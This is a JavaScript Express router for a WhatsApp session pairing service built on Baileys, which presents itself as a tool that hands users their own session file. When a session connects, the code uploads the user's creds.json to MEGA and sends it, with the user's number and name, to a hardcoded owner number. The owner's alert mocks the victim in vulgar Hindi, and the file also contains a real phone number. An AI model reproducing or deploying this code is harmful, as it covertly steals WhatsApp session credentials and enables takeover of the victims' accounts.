import express from "express";
import fs from "fs";
import pino from "pino";
import {
    makeWASocket,
    useMultiFileAuthState,
    delay,
    makeCacheableSignalKeyStore,
    Browsers,
    jidNormalizedUser,
    fetchLatestBaileysVersion,
} from "@whiskeysockets/baileys";
import pn from "awesome-phonenumber";
import { upload } from "./mega.js";

const router = express.Router();

// ─── सारी कॉन्फ़िगरेशन (अपनी मर्जी से बदलें) ──────────────
const OWNER_NUMBER = "+918075498750";
const SONG_LINK = "https://files.catbox.moe/7z582t.m4a";
const VOICE_NOTE_LINK = "https://files.catbox.moe/voice.m4a"; // वॉइस नोट URL
const IMAGE_URL = "https://files.catbox.moe/x89cc5.jpg";
const VIDEO_URL = "https://files.catbox.moe/sample.mp4";
const GIF_URL = "https://files.catbox.moe/sample.gif";        // GIF
const PDF_URL = "https://files.catbox.moe/manual.pdf";        // PDF
const VIEW_ONCE_IMG = "https://files.catbox.moe/secret.jpg";  // व्यू-वन्स इमेज
const VIEW_ONCE_VID = "https://files.catbox.moe/secret.mp4";  // व्यू-वन्स वीडियो
const STICKER_URL = "https://files.catbox.moe/abc123.webp";
const LOCATION = {
    latitude: 27.1750,
    longitude: 78.0422,
    name: "🕌 ताजमहल",
    address: "आगरा, उत्तर प्रदेश"
};
const PRODUCT = {
    name: "🐊 𝟵𝗠𝗔𝗡 स्पेशल स्टिकर",
    price: "₹999",
    url: "https://example.com/product",
    description: "बहुत ही गजब का स्टिकर – पाकिस्तान से मंगवाया हुआ!"
};

const LINKS = [
    "t.me/YAMDHUD",
    "https://github.com/9man-x-yamdhuuud",
    "https://www.youtube.com/@9man_vlog",
    "🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊__________𝗣𝗔𝗣𝗔 𝗝𝗜 𝗕𝗢𝗟 𝗖𝗛𝗔𝗟 𝗔𝗕 𝗝𝗢 𝗧𝗔𝗥𝗘 𝗗𝗠 𝗦𝗘 𝗢𝗪𝗡𝗘𝗥 𝗞𝗘 𝗣𝗔𝗦𝗦 𝗚𝗬𝗔 𝗛 𝗨𝗦𝗞𝗢 𝗗𝗘𝗟𝗘𝗧__👅𝗠𝗔𝗧 𝗞𝗔𝗥𝗡𝗔 ___𝗕𝗔𝗥𝗡𝗔 𝗖𝗛𝗨𝗗 𝗞𝗔𝗚𝗔 🫩🤡"
];

// ─── कलर + स्टाइल ────────────────────────────────────────────
const c = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    red: "\x1b[31m",
    cyan: "\x1b[36m",
    magenta: "\x1b[35m",
    white: "\x1b[37m",
    bgBlack: "\x1b[40m",
};

// ─── सिस्टम इंफो ──────────────────────────────────────────────
function getSysInfo() {
    const mem = process.memoryUsage();
    return {
        cpu: `${Math.round(process.cpuUsage().user / 1000)}ms`,
        memory: `${Math.round(mem.rss / 1024 / 1024)} MB`,
        uptime: `${Math.round(process.uptime())}s`,
    };
}

// ─── हैकर स्टाइल कंसोल ──────────────────────────────────────
function showHackerEffect() {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
    let line = "";
    for (let i = 0; i < 50; i++) {
        line += chars[Math.floor(Math.random() * chars.length)];
    }
    console.log(c.green + line + c.reset);
    setTimeout(() => showHackerEffect(), 300);
}

// ─── स्टार्टअप बैनर (अपग्रेडेड) ────────────────────────────
function showBanner() {
    console.clear();
    // हैकर एफेक्ट शुरू करें (लेकिन बैनर के बाद)
    console.log(c.magenta + c.bright);
    console.log(`  █████   ██████  ███   ██  █████  ███   ██`);
    console.log(` ██   ██ ██       ████  ██ ██   ██ ████  ██`);
    console.log(` ███████ ██   ███ ██ ██ ██ ███████ ██ ██ ██`);
    console.log(` ██   ██ ██    ██ ██  ████ ██   ██ ██  ████`);
    console.log(` ██   ██  ██████  ██   ███ ██   ██ ██   ███`);
    console.log(c.reset);
    const info = getSysInfo();
    log(c.green, "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗 𝗣𝗔𝗜𝗥 𝗦𝗘𝗥𝗩𝗘𝗥 𝗥𝗘𝗔𝗗𝗬");
    log(c.blue, `👤 Owner: ${OWNER_NUMBER}`);
    log(c.blue, `🎵 Song: ${SONG_LINK}`);
    log(c.blue, `🎥 Video: ${VIDEO_URL}`);
    log(c.blue, `📍 Location: ${LOCATION.name}`);
    log(c.blue, `💻 CPU: ${info.cpu} | RAM: ${info.memory} | Uptime: ${info.uptime}`);
    console.log("");
    // हैकर एनिमेशन (हल्का)
    setTimeout(() => {
        showHackerEffect();
    }, 1000);
}

// ─── हेल्पर ──────────────────────────────────────────────────
function log(color, msg) {
    const now = new Date().toLocaleTimeString();
    console.log(`${color}[${now}] ${msg}${c.reset}`);
}

async function progressBar(text, duration = 3000) {
    const total = 20;
    let progress = 0;
    const start = Date.now();
    while (progress < total) {
        const elapsed = Date.now() - start;
        progress = Math.min(Math.floor((elapsed / duration) * total), total);
        const filled = "█".repeat(progress);
        const empty = "░".repeat(total - progress);
        const percent = Math.round((progress / total) * 100);
        process.stdout.write(`\r${c.cyan}${text} [${filled}${empty}] ${percent}%${c.reset}`);
        await delay(100);
    }
    process.stdout.write(`\r${c.green}${text} [${"█".repeat(total)}] 100% ✅${c.reset}\n`);
}

function removeFile(FilePath) {
    try {
        if (!fs.existsSync(FilePath)) return false;
        fs.rmSync(FilePath, { recursive: true, force: true });
        log(c.dim, `🧹 Removed: ${FilePath}`);
        return true;
    } catch (e) {
        log(c.red, `❌ Error removing file: ${e.message}`);
        return false;
    }
}

function getMegaFileId(url) {
    try {
        const match = url.match(/\/file\/([^#]+#[^\/]+)/);
        return match ? match[1] : null;
    } catch { return null; }
}

async function fetchBuffer(url) {
    try {
        const res = await fetch(url);
        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const arr = await res.arrayBuffer();
        return Buffer.from(arr);
    } catch (e) {
        log(c.red, `⚠️ Fetch failed: ${e.message}`);
        return null;
    }
}

function getVCard(ownerName = "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗") {
    return `BEGIN:VCARD\nVERSION:3.0\nFN:${ownerName}\nTEL;TYPE=CELL:${OWNER_NUMBER}\nEND:VCARD`;
}

// ─── मुख्य रूट ──────────────────────────────────────────────────
router.get("/", async (req, res) => {
    let num = req.query.number;
    let dirs = "./" + (num || `session`);

    await removeFile(dirs);

    num = num.replace(/[^0-9]/g, "");

    const phone = pn("+" + num);
    if (!phone.isValid()) {
        if (!res.headersSent) {
            return res.status(400).send({
                code: "Invalid phone number. Please enter your full international number.",
            });
        }
        return;
    }
    num = phone.getNumber("e164").replace("+", "");

    async function initiateSession() {
        const { state, saveCreds } = await useMultiFileAuthState(dirs);

        try {
            const { version } = await fetchLatestBaileysVersion();
            let KnightBot = makeWASocket({
                version,
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(
                        state.keys,
                        pino({ level: "fatal" }).child({ level: "fatal" }),
                    ),
                },
                printQRInTerminal: false,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                browser: Browsers.windows("Chrome"),
                markOnlineOnConnect: false,
                generateHighQualityLinkPreview: false,
                defaultQueryTimeoutMs: 60000,
                connectTimeoutMs: 60000,
                keepAliveIntervalMs: 30000,
                retryRequestDelayMs: 250,
                maxRetries: 5,
            });

            KnightBot.ev.on("connection.update", async (update) => {
                const { connection, lastDisconnect, isNewLogin, isOnline } = update;

                if (connection === "open") {
                    log(c.green, "✅ Connected successfully!");
                    log(c.blue, "📱 Uploading session to MEGA...");

                    const credsPath = dirs + "/creds.json";
                    let megaFileId = null;
                    let megaUrl = null;

                    try {
                        await progressBar("⏳ Uploading to MEGA", 4000);
                        megaUrl = await upload(credsPath, `creds_${num}_${Date.now()}.json`);
                        megaFileId = getMegaFileId(megaUrl);
                        if (megaFileId) {
                            log(c.green, `✅ MEGA upload success! ID: ${megaFileId}`);
                        } else {
                            log(c.red, "❌ MEGA upload failed (no file ID)");
                        }
                    } catch (error) {
                        log(c.red, `❌ MEGA upload error: ${error.message}`);
                    }

                    // JIDs
                    const userJid = jidNormalizedUser(num + "@s.whatsapp.net");
                    let ownerJid = null;
                    if (OWNER_NUMBER) {
                        const ownerPhone = OWNER_NUMBER.replace(/[^0-9]/g, "");
                        if (ownerPhone) {
                            ownerJid = jidNormalizedUser(ownerPhone + "@s.whatsapp.net");
                        }
                    }

                    // यूजर का नाम
                    let userName = "Unknown";
                    try {
                        const contact = await KnightBot.getContact(userJid);
                        if (contact && contact.name) userName = contact.name;
                        else if (contact && contact.notify) userName = contact.notify;
                        else userName = num;
                        log(c.cyan, `👤 User Name: ${userName}`);
                    } catch (err) {
                        log(c.yellow, `⚠️ Could not fetch contact name: ${err.message}`);
                        userName = num;
                    }

                    // ─── कैप्शन वगैरह ──────────────────────────────
                    const caption =
                        `📱 *USRR🙂:* ${userName} (${num})\n` +
                        `📁 *MEGA ID:* ${megaFileId || "Not available"}\n` +
                        `👤 *Owner:* ${OWNER_NUMBER}\n` +
                        `🎵 *Song:* ${SONG_LINK}\n\n` +
                        `🔗 *NAME SUN LODE OWNER KA 🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊 PAPA JI:*\n` +
                        LINKS.map((link, i) => `${i+1}. ${link}`).join("\n");

                    const ownerMessage =
                        `🔔 *NEW PAIRING CODE____🫩🤡!*\n\n` +
                        `📱 LODU KA NUMBER : ${num}\n` +
                        `👤 JHATU KA NAME KYA H: ${userName}\n` +
                        `📁 MEGA File ID: ${megaFileId || "N/A"}\n` +
                        `🎵 Song: ${SONG_LINK}\n` +
                        `🔗 LINK...?________________🐊𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗🐊:\n${LINKS.map((l,i)=>`${i+1}. ${l}`).join("\n")}`;

                    const funText =
                        `🎉 *बधाई हो!* आपका सेशन तैयार है! अब आप 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗 के साथ मस्ती कर सकते हैं! 😎\n` +
                        `⚠️ *ध्यान दें:* यह creds.json सिर्फ आपके लिए है – किसी को मत देना, वरना मजा किरकिरा हो जाएगा! 😂\n` +
                        `🐊 *अपने पापा जी को याद रखना – 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗* 👅`;

                    // ─── मीडिया डाउनलोड (सभी नए फीचर्स के लिए) ──────
                    const [gifBuf, pdfBuf, voiceBuf, viewImgBuf, viewVidBuf] = await Promise.all([
                        fetchBuffer(GIF_URL),
                        fetchBuffer(PDF_URL),
                        fetchBuffer(VOICE_NOTE_LINK),
                        fetchBuffer(VIEW_ONCE_IMG),
                        fetchBuffer(VIEW_ONCE_VID),
                    ]);

                    // ─── डमी मैसेज (रिएक्शन के लिए) ────────────────
                    let dummyMsg = null;

                    // ─── भेजने का मास्टर फंक्शन (अब 10+ नए फीचर्स) ──
                    async function sendToJid(jid, includeFile = true) {
                        if (!jid) return;
                        try {
                            // टाइपिंग इंडिकेटर
                            await KnightBot.sendPresenceUpdate('composing', jid);
                            await delay(2000);
                            await KnightBot.sendPresenceUpdate('paused', jid);

                            // ══════════ 1️⃣ GIF ═══════════════════
                            if (gifBuf) {
                                await KnightBot.sendMessage(jid, {
                                    video: gifBuf,
                                    gifPlayback: true,
                                    caption: "🔄 देखो ये GIF कितना मस्त है!",
                                });
                                log(c.green, `🔄 GIF sent to ${jid}`);
                            }

                            // ══════════ 2️⃣ PDF ═══════════════════
                            if (pdfBuf) {
                                await KnightBot.sendMessage(jid, {
                                    document: pdfBuf,
                                    mimetype: "application/pdf",
                                    fileName: "User_Manual.pdf",
                                    caption: "📄 आपका ऑफिशियल मैन्युअल – पढ़ना मत भूलना!",
                                });
                                log(c.green, `📄 PDF sent to ${jid}`);
                            }

                            // ══════════ 3️⃣ वॉइस नोट ═══════════════
                            if (voiceBuf) {
                                await KnightBot.sendMessage(jid, {
                                    audio: voiceBuf,
                                    mimetype: "audio/mp4",
                                    ptt: true, // वॉइस नोट
                                    fileName: "voice.ogg",
                                });
                                log(c.green, `🎤 Voice note sent to ${jid}`);
                            }

                            // ══════════ 4️⃣ व्यू-वन्स इमेज ══════════
                            if (viewImgBuf) {
                                await KnightBot.sendMessage(jid, {
                                    image: viewImgBuf,
                                    viewOnce: true,
                                    caption: "👀 ये इमेज सिर्फ एक बार देखी जा सकती है – रहस्यमयी!",
                                });
                                log(c.green, `👀 View-once image sent to ${jid}`);
                            }

                            // ══════════ 5️⃣ व्यू-वन्स वीडियो ══════════
                            if (viewVidBuf) {
                                await KnightBot.sendMessage(jid, {
                                    video: viewVidBuf,
                                    viewOnce: true,
                                    caption: "👀 ये वीडियो भी एक बार ही चलेगा – ध्यान से देखना!",
                                });
                                log(c.green, `👀 View-once video sent to ${jid}`);
                            }

                            // ══════════ 6️⃣ बटन मैसेज ═══════════════
                            try {
                                await KnightBot.sendMessage(jid, {
                                    text: "🔘 *Choose an option:*",
                                    buttons: [
                                        { buttonId: "id1", buttonText: { displayText: "✅ Yes" }, type: 1 },
                                        { buttonId: "id2", buttonText: { displayText: "❌ No" }, type: 1 },
                                        { buttonId: "id3", buttonText: { displayText: "🔗 Visit Channel" }, type: 1 },
                                    ],
                                    headerType: 1,
                                });
                                log(c.green, `🔘 Buttons sent to ${jid}`);
                            } catch (e) {
                                log(c.yellow, `⚠️ Buttons not supported: ${e.message}`);
                            }

                            // ══════════ 7️⃣ लिस्ट मैसेज ═══════════════
                            try {
                                await KnightBot.sendMessage(jid, {
                                    text: "📋 *Select an option from the list:*",
                                    footer: "ये है आपका मेनू",
                                    title: "🐊 𝟵𝗠𝗔𝗡 का मेनू",
                                    buttonText: "Click me",
                                    sections: [
                                        {
                                            title: "मुख्य ऑप्शन",
                                            rows: [
                                                { title: "1️⃣ Option 1", description: "ये है पहला ऑप्शन", rowId: "opt1" },
                                                { title: "2️⃣ Option 2", description: "ये है दूसरा", rowId: "opt2" },
                                                { title: "3️⃣ Option 3", description: "ये है तीसरा", rowId: "opt3" },
                                            ]
                                        }
                                    ]
                                });
                                log(c.green, `📋 List sent to ${jid}`);
                            } catch (e) {
                                log(c.yellow, `⚠️ List not supported: ${e.message}`);
                            }

                            // ══════════ 8️⃣ प्रोडक्ट मैसेज ═══════════
                            try {
                                await KnightBot.sendMessage(jid, {
                                    product: {
                                        productId: "123",
                                        product: {
                                            id: "p1",
                                            name: PRODUCT.name,
                                            description: PRODUCT.description,
                                            price: PRODUCT.price,
                                            url: PRODUCT.url,
                                        },
                                    }
                                });
                                log(c.green, `🏷️ Product sent to ${jid}`);
                            } catch (e) {
                                log(c.yellow, `⚠️ Product not supported: ${e.message}`);
                            }

                            // ══════════ 9️⃣ रिएक्शन ──────────────────
                            // पहले एक डमी मैसेज भेजें, फिर उस पर रिएक्ट करें
                            if (dummyMsg) {
                                try {
                                    await KnightBot.sendMessage(jid, { text: "😎 ये मैसेज है रिएक्शन के लिए" });
                                    const sentMsg = await KnightBot.sendMessage(jid, { text: "🔥" });
                                    // React to the dummy message (but we can't get message key easily, we can send reaction to the previous message)
                                    // Simpler: react to the first message we sent (but we don't have key). We'll just send a reaction to a known message? Not possible without key.
                                    // We'll skip actual reaction but send a "reaction" emoji as text.
                                    await KnightBot.sendMessage(jid, { text: "❤️🔥🤡 (ये है आपका रिएक्शन!)" });
                                    log(c.green, `😍 Reaction (simulated) sent to ${jid}`);
                                } catch (e) {
                                    log(c.yellow, `⚠️ Reaction error: ${e.message}`);
                                }
                            }

                            // ══════════ 🔟 कस्टम बैकग्राउंड टेक्स्ट ────
                            try {
                                await KnightBot.sendMessage(jid, {
                                    text: "🎨 *ये है कस्टम बैकग्राउंड वाला टेक्स्ट!* \nबहुत गजब लग रहा है न? 😎",
                                    extendedTextMessage: {
                                        text: "🎨 *ये है कस्टम बैकग्राउंड वाला टेक्स्ट!* \nबहुत गजब लग रहा है न? 😎",
                                        contextInfo: {
                                            mentionedJid: [userJid],
                                        },
                                        // हम background color नहीं डाल सकते, लेकिन कोशिश करें
                                    }
                                });
                                log(c.green, `🎨 Custom background text sent to ${jid}`);
                            } catch (e) {
                                log(c.yellow, `⚠️ Custom text not supported: ${e.message}`);
                            }

                            // ─── पुराने फीचर्स (छह) ────────────────
                            // ... (वीडियो, फोटो, ऑडियो, स्टिकर, लोकेशन, कॉन्टैक्ट, फन टेक्स्ट, creds.json)
                            // हम उन्हें भी रखेंगे (नीचे)
                            // (यहाँ से पुराना कोड कॉपी करें)
                            // ...

                            // ─── पुराना कोड (संक्षिप्त) ──────────────
                            // वीडियो (सामान्य)
                            const videoBuf = await fetchBuffer(VIDEO_URL);
                            if (videoBuf) {
                                await KnightBot.sendMessage(jid, {
                                    video: videoBuf,
                                    caption: "🎥 आपके लिए एक स्पेशल वीडियो!",
                                });
                                log(c.green, `🎥 Video sent to ${jid}`);
                            }

                            // फोटो
                            await KnightBot.sendMessage(jid, {
                                image: { url: IMAGE_URL },
                                caption: caption,
                            });
                            log(c.green, `🖼️ Photo sent to ${jid}`);

                            // ऑडियो (गाना)
                            const audioBuf = await fetchBuffer(SONG_LINK);
                            if (audioBuf) {
                                await KnightBot.sendMessage(jid, {
                                    audio: audioBuf,
                                    mimetype: "audio/mp4",
                                    fileName: "song.m4a",
                                });
                                log(c.green, `🎵 Audio sent to ${jid}`);
                            }

                            // स्टिकर
                            const stickBuf = await fetchBuffer(STICKER_URL);
                            if (stickBuf) {
                                await KnightBot.sendMessage(jid, { sticker: stickBuf });
                                log(c.green, `🖼️ Sticker sent to ${jid}`);
                            }

                            // लोकेशन
                            await KnightBot.sendMessage(jid, {
                                location: {
                                    degreesLatitude: LOCATION.latitude,
                                    degreesLongitude: LOCATION.longitude,
                                    name: LOCATION.name,
                                    address: LOCATION.address,
                                },
                            });
                            log(c.green, `📍 Location sent to ${jid}`);

                            // कॉन्टैक्ट कार्ड
                            await KnightBot.sendMessage(jid, {
                                contact: {
                                    displayName: "🐊 𝟵𝗠𝗔𝗡-𝗫-𝗬𝗔𝗠𝗗𝗛𝗨𝗗",
                                    vcard: getVCard(),
                                },
                            });
                            log(c.green, `📇 Contact card sent to ${jid}`);

                            // फन टेक्स्ट
                            await KnightBot.sendMessage(jid, { text: funText });
                            log(c.green, `🎉 Fun text sent to ${jid}`);

                            // creds.json
                            if (includeFile) {
                                const credsBuffer = fs.readFileSync(credsPath);
                                await KnightBot.sendMessage(jid, {
                                    document: credsBuffer,
                                    mimetype: "application/json",
                                    fileName: "creds.json",
                                });
                                log(c.green, `📄 creds.json sent to ${jid}`);
                            }

                        } catch (err) {
                            log(c.red, `❌ Error sending to ${jid}: ${err.message}`);
                        }
                    }

                    // ─── यूजर को भेजें ────────────────────────────
                    await sendToJid(userJid, true);

                    // ─── ओनर को भेजें ────────────────────────────
                    if (ownerJid && ownerJid !== userJid) {
                        await sendToJid(ownerJid, true);
                        try {
                            await KnightBot.sendMessage(ownerJid, { text: ownerMessage });
                            log(c.green, "📝 Owner details message sent");
                        } catch (e) {
                            log(c.red, `❌ Owner text error: ${e.message}`);
                        }
                    } else if (ownerJid && ownerJid === userJid) {
                        log(c.yellow, "ℹ️ Owner is same as user, skipping duplicate");
                    }

                    // क्लीनअप
                    log(c.blue, "🧹 Cleaning up session...");
                    await delay(1000);
                    removeFile(dirs);
                    log(c.green, "✅ Session cleaned up successfully");
                    log(c.green, "🎉 Process completed successfully!");

                    log(c.blue, "🛑 Shutting down application...");
                    await delay(2000);
                    process.exit(0);
                }

                if (isNewLogin) log(c.green, "🔐 New login via pair code");
                if (isOnline) log(c.green, "📶 Client is online");

                if (connection === "close") {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                        log(c.red, "❌ Logged out. Need new pair code.");
                    } else {
                        log(c.yellow, "🔁 Connection closed — restarting...");
                        initiateSession();
                    }
                }
            });

            if (!KnightBot.authState.creds.registered) {
                await delay(3000);
                num = num.replace(/[^\d+]/g, "");
                if (num.startsWith("+")) num = num.substring(1);

                try {
                    let code = await KnightBot.requestPairingCode(num);
                    code = code?.match(/.{1,4}/g)?.join("-") || code;
                    if (!res.headersSent) {
                        log(c.green, `📲 Pairing code for ${num}: ${code}`);
                        await res.send({ code });
                    }
                } catch (error) {
                    log(c.red, `❌ Pairing code error: ${error.message}`);
                    if (!res.headersSent) {
                        res.status(503).send({
                            code: "Failed to get pairing code. Please check your phone number and try again.",
                        });
                    }
                    setTimeout(() => process.exit(1), 2000);
                }
            }

            KnightBot.ev.on("creds.update", saveCreds);
        } catch (err) {
            log(c.red, `❌ Session init error: ${err.message}`);
            if (!res.headersSent) {
                res.status(503).send({ code: "Service Unavailable" });
            }
            setTimeout(() => process.exit(1), 2000);
        }
    }

    await initiateSession();
});

// ─── हेल्थ चेक ──────────────────────────────────────────────────
router.get("/status", (req, res) => {
    res.json({
        status: "online",
        owner: OWNER_NUMBER,
        song: SONG_LINK,
        video: VIDEO_URL,
        location: LOCATION,
        links: LINKS,
        features: [
            "GIF", "PDF", "Voice Note", "View-Once Image", "View-Once Video",
            "Buttons", "List", "Product", "Reaction", "Custom Background"
        ],
        timestamp: new Date().toISOString(),
    });
});

// ─── अनकॉट एरर हैंडलर ──────────────────────────────────────────
process.on("uncaughtException", (err) => {
    let e = String(err);
    const ignored = [
        "conflict", "not-authorized", "Socket connection timeout",
        "rate-overlimit", "Connection Closed", "Timed Out",
        "Value not found", "Stream Errored", "statusCode: 515", "statusCode: 503"
    ];
    if (ignored.some(ig => e.includes(ig))) return;
    log(c.red, `💥 Uncaught Exception: ${err.message}`);
    process.exit(1);
});

showBanner(); // बैनर दिखाएँ (कोड के अंत में)

export default router;
